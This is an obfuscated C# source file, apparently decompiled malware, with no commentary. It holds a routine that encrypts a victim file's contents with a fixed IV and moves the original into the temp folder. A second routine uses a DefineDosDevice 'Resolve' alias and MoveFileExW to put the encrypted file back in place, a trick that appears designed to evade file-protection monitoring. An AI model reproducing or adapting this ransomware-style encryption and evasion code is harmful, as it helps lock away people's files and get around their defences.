using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace JcxFVLIspytryi;

public class MuveoLbJpwyzpb
{
	[DllImport("kernel32.dll")]
	private static extern bool DefineDosDevice(uint GftacnVIaNoYn, string BmwgJdIbLkh, string YimSaPAkGRALvYM);

	public static void RZkwDpemgxFjUJF(string vjcqRZSVlNdRKv = null)
	{
		try
		{
			DefineDosDevice(3u, "Resolve", string.Empty);
		}
		catch
		{
		}
	}

	private static bool ewuNKVWJVVMGtKx(string xbvnDrZeFwCETs, out string VkoQhwMDND)
	{
		byte[] qELtlVjpGyNbL = JEEjYAYTthGQk.vrYKkYAgynL(xbvnDrZeFwCETs, Convert.ToInt32(dHGXNFcRMdII.cCwjTHNTri) * 1024 * 1024);
		byte[] pkaxVhkfjwFvUR = JEEjYAYTthGQk.dYFSNeFMIygNvr(qELtlVjpGyNbL, Encoding.ASCII.GetBytes(dHGXNFcRMdII.lItsEzKxdxFW), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		VkoQhwMDND = string.Empty;
		string empty = string.Empty;
		try
		{
			empty = Path.GetTempPath() + "\\";
		}
		catch
		{
			return false;
		}
		string text;
		do
		{
			text = Guid.NewGuid().ToString();
		}
		while (File.Exists(empty + text));
		VkoQhwMDND = empty + text;
		try
		{
			File.Move(xbvnDrZeFwCETs, VkoQhwMDND);
			JEEjYAYTthGQk.HOLazjWLXiaC(VkoQhwMDND, pkaxVhkfjwFvUR);
		}
		catch
		{
			return false;
		}
		return true;
	}

	private static bool rlqaVUaQBWUlvhYI(string zPoUomfzapnYlyx, string dBBFRftTyRYgM)
	{
		try
		{
			if (!DefineDosDevice(1u, "Resolve", "\\??\\" + dBBFRftTyRYgM))
			{
				return false;
			}
			if (!dHGXNFcRMdII.MoveFileExW(zPoUomfzapnYlyx, "\\\\.\\Resolve", 9u))
			{
				return false;
			}
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static bool YeXegMvsjCRGOXGpA(string RXTYLWBLRDKetl)
	{
		string VkoQhwMDND = "";
		RZkwDpemgxFjUJF();
		if (!ewuNKVWJVVMGtKx(RXTYLWBLRDKetl, out VkoQhwMDND))
		{
			RZkwDpemgxFjUJF(VkoQhwMDND);
			return false;
		}
		if (!rlqaVUaQBWUlvhYI(VkoQhwMDND, RXTYLWBLRDKetl))
		{
			RZkwDpemgxFjUJF(VkoQhwMDND);
			return false;
		}
		RZkwDpemgxFjUJF();
		return true;
	}
}
